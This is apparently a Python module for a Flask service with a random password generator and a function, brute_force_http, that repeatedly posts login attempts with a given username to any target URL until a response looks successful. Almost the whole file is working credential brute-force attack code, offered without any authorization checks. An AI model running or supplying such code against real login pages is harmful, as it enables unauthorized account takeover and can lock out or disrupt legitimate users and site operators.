import requests
import random
import string
from flask import jsonify


def generate_passwords(length=8, count=10, include_special_chars=True):
    """
    Generate a list of random passwords.

    :param length: Length of each password (default: 8)
    :param count: Number of passwords to generate (default: 10)
    :param include_special_chars: Include special characters in the password (default: True)
    :return: List of generated passwords
    """
    # Define character sets
    letters = string.ascii_letters
    digits = string.digits
    special_chars = string.punctuation if include_special_chars else ""

    # Combine character sets
    all_chars = letters + digits + special_chars

    # Generate passwords
    passwords = [
        ''.join(random.choice(all_chars) for _ in range(length))
        for _ in range(count)
    ]
    return passwords


def brute_force_http(data):
    target_url = data.get('url')
    username = data.get('username')
    password_list = data.get('passwords') or generate_passwords(length=8,
                                                                count=20)  # Generate passwords if not provided
    login_field = data.get('login_field', 'username')  # Default field name for username
    password_field = data.get('password_field', 'password')  # Default field name for password

    if not target_url or not username:
        return jsonify({"error": "URL and username are required"}), 400

    results = []
    for password in password_list:
        try:
            # Prepare the payload
            payload = {
                login_field: username,
                password_field: password
            }

            # Send HTTP POST request
            response = requests.post(target_url, data=payload, timeout=5)

            # Check the response
            if response.status_code == 200 and "invalid" not in response.text.lower():
                results.append({"password": password, "success": True})
                break
            else:
                results.append({"password": password, "success": False})

        except requests.RequestException as e:
            return jsonify({"error": str(e)}), 500

    return jsonify({"results": results}), 200
